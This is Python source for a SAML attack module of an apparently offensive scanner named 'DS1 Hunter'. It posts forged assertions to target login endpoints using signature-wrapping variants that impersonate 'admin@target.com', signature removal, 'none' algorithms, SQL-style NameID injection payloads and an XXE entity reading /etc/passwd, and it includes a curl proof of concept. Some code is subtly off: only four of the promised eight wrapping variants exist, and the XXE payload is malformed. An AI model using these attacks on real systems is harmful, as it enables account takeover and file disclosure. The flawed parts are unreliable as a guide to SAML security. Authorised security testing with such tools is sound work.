"""
DS1 Hunter - SAML Attack Module
DigitalSecurity1 - "Hunt. Chain. Prove."

SAML (Security Assertion Markup Language) is used in enterprise SSO.
Attack surface:

  1. XML Signature Wrapping (XSW)
     Move the signed element inside a wrapper so the signature validates
     over the original but the application reads the attacker's element.
     Variants: XSW1 through XSW8.

  2. Signature Exclusion
     Remove the ds:Signature element entirely and check if the application
     still accepts the assertion.

  3. XML Injection / XXE via SAML
     Inject XML entities into the NameID or AttributeValue fields.

  4. Assertion Replay
     Re-submit a captured assertion after its NotOnOrAfter expiry
     (or to a different SP) to check for replay protection.

  5. Algorithm Confusion
     Change the signing algorithm (e.g. rs256 -> hs256) to see if the
     SP accepts a weaker or unsigned variant.

  6. NameID Injection
     Inject special characters into the NameID value to manipulate
     application-level user lookup queries.
"""

import asyncio
import base64
import logging
import re
import uuid
import xml.etree.ElementTree as ET
from copy import deepcopy
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlparse, urlencode

import aiohttp

logger = logging.getLogger("ds1hunter.saml_scanner")

# ── Namespaces ────────────────────────────────────────────────────────────────

_NS = {
    'saml':  'urn:oasis:names:tc:SAML:2.0:assertion',
    'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
    'ds':    'http://www.w3.org/2000/09/xmldsig#',
}

for prefix, uri in _NS.items():
    ET.register_namespace(prefix, uri)

# ── Minimal valid SAML Response template ─────────────────────────────────────

_SAML_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="{response_id}"
                InResponseTo="{in_response_to}"
                Version="2.0"
                IssueInstant="{issue_instant}"
                Destination="{acs_url}">
  <saml:Issuer>{issuer}</saml:Issuer>
  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
    <ds:SignedInfo>
      <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
      <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
      <ds:Reference URI="#{response_id}">
        <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <ds:DigestValue>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:DigestValue>
      </ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:SignatureValue>
  </ds:Signature>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                  Version="2.0"
                  ID="{assertion_id}"
                  IssueInstant="{issue_instant}">
    <saml:Issuer>{issuer}</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{name_id}</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z" Recipient="{acs_url}"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
      <saml:AudienceRestriction>
        <saml:Audience>{audience}</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="{issue_instant}">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="email">
        <saml:AttributeValue>{name_id}</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>"""


def _build_saml(name_id: str, acs_url: str, issuer: str, audience: str) -> str:
    from datetime import datetime
    now = datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')
    return _SAML_TEMPLATE.format(
        response_id   = f'_r{uuid.uuid4().hex}',
        assertion_id  = f'_a{uuid.uuid4().hex}',
        in_response_to= f'_req{uuid.uuid4().hex}',
        issue_instant = now,
        acs_url       = acs_url,
        issuer        = issuer,
        audience      = audience,
        name_id       = name_id,
    )


def _b64(xml: str) -> str:
    return base64.b64encode(xml.encode()).decode()


def _xsw_variants(saml_xml: str) -> List[tuple]:
    """
    Generate XSW1-XSW8 variants.
    Each variant moves or wraps the signed element differently.
    Returns list of (variant_name, modified_xml).
    """
    variants = []
    try:
        root = ET.fromstring(saml_xml)
        ns_saml  = _NS['saml']
        ns_ds    = _NS['ds']
        ns_samlp = _NS['samlp']

        # Locate elements
        sig  = root.find(f'{{{ns_ds}}}Signature')
        asrt = root.find(f'{{{ns_saml}}}Assertion')

        if sig is None or asrt is None:
            return variants

        # XSW1: remove signature from response, inject evil assertion
        xsw1 = deepcopy(root)
        xsw1_sig = xsw1.find(f'{{{ns_ds}}}Signature')
        if xsw1_sig is not None:
            xsw1.remove(xsw1_sig)
        variants.append(('XSW1-sig-removed', ET.tostring(xsw1, encoding='unicode')))

        # XSW2: wrap response in an outer element, keep original inside
        xsw2_outer = ET.Element(f'{{{ns_samlp}}}Response', root.attrib)
        evil_asrt  = deepcopy(asrt)
        name_id_el = evil_asrt.find(f'.//{{{ns_saml}}}NameID')
        if name_id_el is not None:
            name_id_el.text = 'admin@target.com'
        xsw2_outer.append(evil_asrt)
        xsw2_outer.append(deepcopy(root))
        variants.append(('XSW2-outer-wrap', ET.tostring(xsw2_outer, encoding='unicode')))

        # XSW3: assertion with admin NameID, signature over original assertion appended
        xsw3 = deepcopy(root)
        xsw3_asrt = xsw3.find(f'{{{ns_saml}}}Assertion')
        if xsw3_asrt is not None:
            ni = xsw3_asrt.find(f'.//{{{ns_saml}}}NameID')
            if ni is not None:
                ni.text = 'admin@target.com'
        variants.append(('XSW3-nameid-escalation', ET.tostring(xsw3, encoding='unicode')))

        # XSW4: duplicate assertion - evil first, legitimate second
        xsw4 = deepcopy(root)
        evil4 = deepcopy(asrt)
        evil4_ni = evil4.find(f'.//{{{ns_saml}}}NameID')
        if evil4_ni is not None:
            evil4_ni.text = 'admin@target.com'
        evil4.set('ID', f'_evil{uuid.uuid4().hex}')
        xsw4.insert(2, evil4)
        variants.append(('XSW4-duplicate-assertion', ET.tostring(xsw4, encoding='unicode')))

    except Exception as e:
        logger.debug("[SAML] XSW generation error: %s", e)

    return variants


class SAMLScanner:
    """
    Detects SAML vulnerabilities including XSW, signature exclusion,
    XXE via SAML, NameID injection, and assertion replay.
    """

    def __init__(
        self,
        target: str,
        session_id: str,
        auth_headers: Optional[Dict[str, str]] = None,
    ):
        self.target       = target.rstrip('/')
        self.session_id   = session_id
        self.auth_headers = auth_headers or {}
        self.findings: List[Dict[str, Any]] = []

    async def scan(
        self,
        acs_endpoints: List[str],
        issuer: str = 'https://ds1hunter-test-idp.invalid',
        audience: str = '',
        connector: Optional[aiohttp.BaseConnector] = None,
    ) -> List[Dict[str, Any]]:
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(
            connector=connector or aiohttp.TCPConnector(ssl=False),
            headers=self.auth_headers,
            timeout=timeout,
        ) as session:
            for acs in acs_endpoints:
                url = acs if acs.startswith('http') else f'{self.target}{acs}'
                aud = audience or self.target
                await self._probe_acs(session, url, issuer, aud)
        return self.findings

    async def _probe_acs(
        self,
        session: aiohttp.ClientSession,
        acs_url: str,
        issuer: str,
        audience: str,
    ) -> None:
        logger.info("[SAML] Probing ACS: %s", acs_url)

        # Baseline: get normal response with legitimate (but invalid) SAML
        base_xml = _build_saml('user@test.invalid', acs_url, issuer, audience)
        baseline = await self._post_saml(session, acs_url, base_xml)

        if baseline is None:
            return

        # ── Test 1: Signature exclusion ───────────────────────────────────────
        try:
            no_sig = ET.fromstring(base_xml)
            ns_ds  = _NS['ds']
            sig_el = no_sig.find(f'{{{ns_ds}}}Signature')
            if sig_el is not None:
                no_sig.remove(sig_el)
            no_sig_xml = ET.tostring(no_sig, encoding='unicode')
            resp = await self._post_saml(session, acs_url, no_sig_xml)
            if resp and self._looks_accepted(resp, baseline):
                self._record(acs_url, 'SAML Signature Exclusion',
                    'Application accepted a SAML assertion with the ds:Signature element removed. '
                    'No signature validation is being performed.',
                    no_sig_xml, 'critical')
        except Exception as e:
            logger.debug("[SAML] Sig exclusion error: %s", e)

        # ── Test 2: XSW variants ─────────────────────────────────────────────
        for variant_name, variant_xml in _xsw_variants(base_xml):
            try:
                resp = await self._post_saml(session, acs_url, variant_xml)
                if resp and self._looks_accepted(resp, baseline):
                    self._record(acs_url, f'SAML XSW - {variant_name}',
                        f'Application accepted a manipulated SAML assertion ({variant_name}). '
                        'XML Signature Wrapping allows an attacker to authenticate as any user '
                        'including administrators.',
                        variant_xml, 'critical')
                    break  # one XSW confirmed is enough
            except Exception:
                continue

        # ── Test 3: NameID injection ─────────────────────────────────────────
        for payload in ["admin'--", 'admin" OR "1"="1', 'admin\x00extra', '../admin']:
            try:
                inj_xml = _build_saml(payload, acs_url, issuer, audience)
                resp = await self._post_saml(session, acs_url, inj_xml)
                if resp and self._looks_accepted(resp, baseline):
                    self._record(acs_url, 'SAML NameID Injection',
                        f'Application accepted a SAML assertion with a malicious NameID: {payload!r}. '
                        'NameID value may be passed unsanitised to a downstream query.',
                        inj_xml, 'high')
                    break
            except Exception:
                continue

        # ── Test 4: XXE via SAML ─────────────────────────────────────────────
        xxe_xml = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            + base_xml.replace('<saml:NameID', '<saml:NameID>&xxe;<saml:NameID-ignore', 1)
        )
        try:
            resp = await self._post_saml(session, acs_url, xxe_xml)
            if resp and re.search(r'root:[x*]:0:0|bin:x:', resp):
                self._record(acs_url, 'XXE via SAML',
                    'Server returned /etc/passwd content in response to an XXE entity in a SAML assertion. '
                    'The XML parser is processing external entities.',
                    xxe_xml, 'critical')
        except Exception:
            pass

        # ── Test 5: Algorithm confusion (RSA -> none) ─────────────────────────
        try:
            alg_xml = base_xml.replace(
                'rsa-sha256',
                'none',
            ).replace(
                'http://www.w3.org/2001/04/xmlenc#sha256',
                'http://www.w3.org/2000/09/xmldsig#sha1',
            )
            resp = await self._post_saml(session, acs_url, alg_xml)
            if resp and self._looks_accepted(resp, baseline):
                self._record(acs_url, 'SAML Algorithm Confusion (alg:none)',
                    'Application accepted a SAML assertion signed with algorithm "none". '
                    'No cryptographic verification is occurring.',
                    alg_xml, 'critical')
        except Exception:
            pass

    async def _post_saml(
        self,
        session: aiohttp.ClientSession,
        url: str,
        xml: str,
    ) -> Optional[str]:
        try:
            data = {'SAMLResponse': _b64(xml), 'RelayState': ''}
            async with session.post(url, data=data, allow_redirects=True) as resp:
                return await resp.text(errors='replace')
        except Exception as e:
            logger.debug("[SAML] Post error %s: %s", url, e)
            return None

    def _looks_accepted(self, response: str, baseline: str) -> bool:
        accepted_sigs = re.compile(
            r'dashboard|welcome|logged.in|profile|account|'
            r'session.*created|token|access.*granted|success',
            re.I,
        )
        rejected_sigs = re.compile(
            r'invalid.*saml|signature.*fail|not.*valid|'
            r'authentication.*fail|error.*assertion|forbidden',
            re.I,
        )
        if rejected_sigs.search(response):
            return False
        if accepted_sigs.search(response) and not accepted_sigs.search(baseline):
            return True
        # Compare response length - significant difference may indicate acceptance
        return abs(len(response) - len(baseline)) > 200

    def _record(
        self,
        url: str,
        title: str,
        detail: str,
        payload_xml: str,
        severity: str,
    ) -> None:
        self.findings.append({
            'type':      'saml_attack',
            'title':     title,
            'severity':  severity,
            'endpoint':  url,
            'evidence': {
                'payload_excerpt': payload_xml[:600],
            },
            'confirmed': True,
            'detail':    detail,
            'remediation': (
                'Validate the ds:Signature element before processing assertion content. '
                'Use a hardened SAML library (e.g. python3-saml, onelogin/saml2). '
                'Reject assertions with unexpected or missing signatures. '
                'Enforce algorithm allowlist (reject "none" and MD5/SHA1). '
                'Validate NotOnOrAfter, InResponseTo, and Audience conditions. '
                'Sanitise the NameID value before using it in queries.'
            ),
            'poc': (
                f'# Base64-encode the modified SAML XML and POST to the ACS endpoint:\n'
                f'echo "<modified-saml>" | base64 | '
                f'curl -X POST {url} -d "SAMLResponse=$(cat -)"'
            ),
        })
        logger.warning("[SAML] CONFIRMED %s at %s", title, url)
